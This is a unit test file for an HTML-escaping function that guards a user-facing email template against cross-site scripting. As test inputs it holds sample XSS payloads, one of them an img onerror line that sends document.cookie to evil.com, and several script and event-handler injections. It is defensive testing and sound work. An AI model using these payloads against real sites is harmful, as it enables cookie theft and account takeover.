/**
 * Unit tests — HTML escaping in email template
 *
 * These tests verify the critical XSS fix: every HTML special character
 * submitted by a user is neutralised before appearing in the email body.
 *
 * Run: npm test
 */

import { escapeHtml } from "../../lib/email";

describe("escapeHtml", () => {
  test("escapes < (open tag)", () => {
    expect(escapeHtml("<script>")).toBe("&lt;script&gt;");
  });

  test("escapes > (close tag)", () => {
    expect(escapeHtml("a > b")).toBe("a &gt; b");
  });

  test("escapes & (ampersand)", () => {
    expect(escapeHtml("AT&T")).toBe("AT&amp;T");
  });

  test('escapes " (double-quote)', () => {
    expect(escapeHtml('say "hello"')).toBe("say &quot;hello&quot;");
  });

  test("escapes ' (single-quote)", () => {
    expect(escapeHtml("it's fine")).toBe("it&#039;s fine");
  });

  test("leaves safe characters unchanged", () => {
    const safe = "Hello, my name is John Doe. I am 30 years old!";
    expect(escapeHtml(safe)).toBe(safe);
  });

  test("handles empty string", () => {
    expect(escapeHtml("")).toBe("");
  });

  test("escapes a full XSS payload — img onerror", () => {
    const xss = `<img src=x onerror="fetch('https://evil.com/'+document.cookie)">`;
    const escaped = escapeHtml(xss);
    // Should contain no raw < > " characters
    expect(escaped).not.toContain("<");
    expect(escaped).not.toContain(">");
    expect(escaped).not.toContain('"');
    expect(escaped).toContain("&lt;img");
  });

  test("escapes a script tag XSS payload", () => {
    const xss = `<script>alert('xss')</script>`;
    const escaped = escapeHtml(xss);
    expect(escaped).not.toContain("<script>");
    expect(escaped).toContain("&lt;script&gt;");
  });

  test("escapes an event-handler injection", () => {
    const xss = `" onmouseover="alert(1)`;
    const escaped = escapeHtml(xss);
    expect(escaped).not.toContain('"');
    expect(escaped).toContain("&quot;");
  });

  test("double-escaping is idempotent (safe to call twice)", () => {
    // If called twice the & is re-escaped — this is safe and expected
    const once = escapeHtml("<b>bold</b>");
    const twice = escapeHtml(once);
    // Second call must not produce raw tags
    expect(twice).not.toContain("<");
    expect(twice).not.toContain(">");
  });

  test("handles unicode characters without breaking them", () => {
    const input = "Héllo Wörld — café";
    expect(escapeHtml(input)).toBe("Héllo Wörld — café");
  });
});
